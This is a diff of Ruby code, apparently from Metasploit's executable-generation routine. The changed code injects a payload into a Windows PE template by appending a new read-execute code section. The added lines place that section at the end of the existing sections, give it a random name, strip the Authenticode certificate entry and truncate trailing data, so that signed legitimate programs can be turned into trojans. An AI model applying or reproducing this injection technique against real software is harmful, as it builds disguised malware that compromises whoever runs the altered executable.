@@ -142,9 +142,17 @@ require 'digest/sha1'
 		fsize = File.size(opts[:template])
 		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 		text = nil
+		sections_end = 0
 		pe.sections.each do |sec|
 			text = sec if sec.name == ".text"
+			sections_end = sec.size + sec.file_offset if sec.file_offset >= sections_end
 			endjunk = false if sec.contains_file_offset?(fsize-1)
+		end
+		#also check to see if there is a certificate
+		cert_entry = pe.hdr.opt['DataDirectory'][4]
+		#if the cert is the only thing past the sections, we can handle.
+		if cert_entry.v['VirtualAddress'] + cert_entry.v['Size'] >= fsize and sections_end >= cert_entry.v['VirtualAddress']
+			endjunk = false 
 		end
 
 		#try to inject code into executable by adding a section without affecting executable behavior
@@ -155,7 +163,7 @@ require 'digest/sha1'
 
 			#find first section file offset and free RVA for new section
 			free_rva = pe.hdr.opt.AddressOfEntryPoint
-			first_off = fsize
+			first_off = sections_end
 			pe.sections.each do |sec|
 				first_off = sec.file_offset if sec.file_offset < first_off
 				free_rva = sec.raw_size + sec.vma if sec.raw_size + sec.vma > free_rva
@@ -180,11 +188,11 @@ require 'digest/sha1'
 
 			#make new section header
 			new_sechead = Rex::PeParsey::PeBase::IMAGE_SECTION_HEADER.make_struct
-			new_sechead.v['Name'] = "\x00"*8 # no name
+			new_sechead.v['Name'] = Rex::Text.rand_text_alpha(4)+"\x00"*4 # no name
 			new_sechead.v['Characteristics'] = 0x60000020 # READ, EXECUTE, CODE
 			new_sechead.v['VirtualAddress'] = free_rva
 			new_sechead.v['SizeOfRawData'] = new_sec.length
-			new_sechead.v['PointerToRawData'] = fsize
+			new_sechead.v['PointerToRawData'] = sections_end
 
 			# Create the modified version of the input executable
 			exe = ''
@@ -208,10 +216,13 @@ require 'digest/sha1'
 			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE, pe.hdr.file.SizeOfOptionalHeader] = new_opthead.to_s
 			#kill bound import table; if it exists, we probably overwrote it with our new section and they dont even need it anyway
 			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + 184, 8] = "\x00"*8
+			#kill certificate; if it exists, we just invalidated it
+			exe[pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + 128, 8] = "\x00"*8
 
 			#new section header and new section
 			exe[new_sechead_file_off, new_sechead.to_s.length] = new_sechead.to_s
-			exe += new_sec
+			exe[new_sechead.v['PointerToRawData'], new_sec.length] = new_sec
+			exe.slice!((new_sechead.v['PointerToRawData'] + new_sec.length)..-1)
 
 			cks = pe.hdr.opt.CheckSum
 			if(cks != 0)
